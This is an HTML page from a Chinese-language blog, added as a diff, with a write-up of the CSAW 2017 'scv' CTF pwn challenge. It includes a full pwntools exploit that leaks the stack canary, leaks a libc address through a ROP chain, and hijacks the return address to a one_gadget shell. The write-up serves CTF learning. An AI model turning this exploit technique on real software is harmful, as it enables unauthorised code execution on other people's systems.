@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>CSAW Quals CTF 2017 pwn scv | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="(ps：泄露canary入门题)
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+1.查看保护机制信息，搭建环境，ubuntu运行ida*64远程调试文件：
+
+
+
+..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">CSAW Quals CTF 2017 pwn scv</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>(ps：泄露canary入门题)<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb</p>
+<p>1.查看保护机制信息，搭建环境，ubuntu运行ida*64远程调试文件：<br>
+<img src="https://closefrom.github.io/post-images/1615579616610.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579622881.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579630677.png" alt="" loading="lazy"></p>
+<p>2.ida64打开程序分析：<br>
+<img src="https://closefrom.github.io/post-images/1615579640509.png" alt="" loading="lazy"><br>
+有puts，read函数。<br>
+<img src="https://closefrom.github.io/post-images/1615579650605.png" alt="" loading="lazy"><br>
+在main函数中，有3个选项，1选项中有栈溢出漏洞，2选项中可以泄露栈中数据，3选项退出循环<br>
+思路：泄露canary，泄露read或puts函数got地址，计算出one_gadget地址 劫持返回地址getshell</p>
+<p>3.信息收集：<br>
+<img src="https://closefrom.github.io/post-images/1615579664832.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579672512.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579680123.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579687362.png" alt="" loading="lazy"></p>
+<p>4.编写exp：</p>
+<pre><code>
+from pwn import *
+
+context.binary = './scv'
+file_elf = ELF('./scv')
+read_got = file_elf.got['read']
+puts_add = file_elf.symbols['puts']
+main_start_add = 0x400a96
+pop_rdi_ret_add = 0x400ea3
+
+#用的是本地libc文件中的one_gadget地址和read地址
+libc6_one_gadget_add = 0x45216
+libc_read_add = 0xf7250
+
+link = remote("192.168.93.137","6666")
+link.recvuntil(">>")
+link.sendline('1')
+payload = 'A' * 0xa7 + 'BC'
+link.send(payload)
+link.recvuntil(">>")
+link.sendline('2')
+link.recvuntil("BC")  #截断开始,指针指向BC后的字节
+
+canary = u64('\x00'+link.recv(7))
+print canary
+link.recvuntil(">>")
+link.sendline('1')
+payload2 = 'A' * 0xa8 
+payload2 += p64(canary) 
+payload2 += 'B' * 0x8
+payload2 += p64(pop_rdi_ret_add)
+payload2 += p64(read_got)
+payload2 += p64(puts_add)
+payload2 += p64(main_start_add)
+link.send(payload2)
+link.recvuntil(">>")
+link.sendline('3')
+link.recvuntil("MIENRALS...\n")
+#puts输出read_got地址为0x******
+#小端序
+read_add = u64(link.recv()[:6] + "\x00\x00")
+print read_add
+py_add = read_add - libc_read_add 
+one_gadget_add = py_add + libc6_one_gadget_add
+#link.recvuntil(">>") 这里不能加这句，因 上面read_add 中的link.recv()
+link.sendline("1")
+payload3 = 'A' * 0xa8 
+payload3 += p64(canary)
+payload3 += 'B' * 0x8
+payload3 += p64(one_gadget_add)
+link.recvuntil(">>")
+link.send(payload3)
+link.recvuntil(">>")
+link.sendline('3')
+link.recvuntil("MIENRALS...\n")
+link.interactive()
+</code></pre>
+<p>流程：<br>
+1.进入选项1，栈溢出，覆盖一个字节canary<br>
+2.进入选项2，泄露canary<br>
+3.进入选项1，布置栈布局，泄露read的got地址，来计算与libc文件的偏移，并且返回main函数首地址<br>
+4.进入选项3，退出循环，触发栈溢出漏洞。泄露read的got地址，并且返回main函数首地址<br>
+5.利用泄露的read的got地址计算出与libc的read函数的偏移，然后计算出one_gadget的地址<br>
+6.进入选项1，栈溢出，劫持返回地址为one_gadget地址<br>
+7.进入选项3，退出循环，触发栈溢出漏洞，执行one_gadget</p>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615579725989.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/insomnihack-ctf-2016-pwn-microwave/">
+                  <h3 class="post-title">
+                    insomnihack CTF 2016 pwn microwave
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
